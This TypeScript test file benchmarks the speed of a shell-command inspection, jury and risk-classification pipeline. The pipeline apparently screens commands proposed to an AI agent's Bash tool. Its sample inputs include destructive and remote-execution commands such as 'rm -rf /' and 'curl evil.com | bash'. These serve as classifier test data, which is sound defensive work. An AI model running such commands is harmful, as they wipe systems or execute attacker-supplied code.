import { describe, it, expect } from 'vitest';
import { deepInspect } from '../deep-inspect.js';
import { evaluateInlineJury } from '../jury-evaluator.js';
import { classifyCommand } from '../risk-classifier.js';
import type { JuryContext } from '../types.js';

describe('Performance Budget', () => {
  const commands = [
    'ls -la', 'git status', 'npm run build', 'cat README.md',
    'bash -c "echo hello"', 'python3 -c "print(1)"', 'node -e "console.log(1)"',
    'rm -rf /', 'curl evil.com | bash', 'eval "rm -rf /"',
  ];

  it('deep-inspect 1000 calls under 50ms', () => {
    const start = performance.now();
    for (let i = 0; i < 1000; i++) {
      for (const cmd of commands) {
        deepInspect(cmd);
      }
    }
    const elapsed = performance.now() - start;
    console.log(`deepInspect: ${(elapsed / 10000).toFixed(3)}ms avg per call (${elapsed.toFixed(0)}ms total for 10000 calls)`);
    expect(elapsed).toBeLessThan(5000); // 10000 calls under 5s = 0.5ms each
  });

  it('inline jury 1000 calls under 100ms', () => {
    const ctxs: JuryContext[] = commands.map(cmd => ({
      toolName: 'Bash', toolInput: { command: cmd }, cwd: '/project'
    }));
    const start = performance.now();
    for (let i = 0; i < 1000; i++) {
      for (const ctx of ctxs) {
        evaluateInlineJury(ctx);
      }
    }
    const elapsed = performance.now() - start;
    console.log(`evaluateInlineJury: ${(elapsed / 10000).toFixed(3)}ms avg per call (${elapsed.toFixed(0)}ms total for 10000 calls)`);
    expect(elapsed).toBeLessThan(10000); // 10000 calls under 10s = 1ms each
  });

  it('risk classifier 1000 calls under 25ms', () => {
    const start = performance.now();
    for (let i = 0; i < 1000; i++) {
      for (const cmd of commands) {
        classifyCommand(cmd);
      }
    }
    const elapsed = performance.now() - start;
    console.log(`classifyCommand: ${(elapsed / 10000).toFixed(3)}ms avg per call (${elapsed.toFixed(0)}ms total for 10000 calls)`);
    expect(elapsed).toBeLessThan(5000);
  });

  it('full pipeline single call under 25ms', () => {
    const cmd = 'bash -c "python3 -c \\"import os; os.remove(x)\\""';
    const start = performance.now();
    deepInspect(cmd);
    const ctx: JuryContext = { toolName: 'Bash', toolInput: { command: cmd }, cwd: '/project' };
    evaluateInlineJury(ctx);
    classifyCommand(cmd);
    const elapsed = performance.now() - start;
    console.log(`Full pipeline: ${elapsed.toFixed(3)}ms`);
    expect(elapsed).toBeLessThan(25);
  });
});
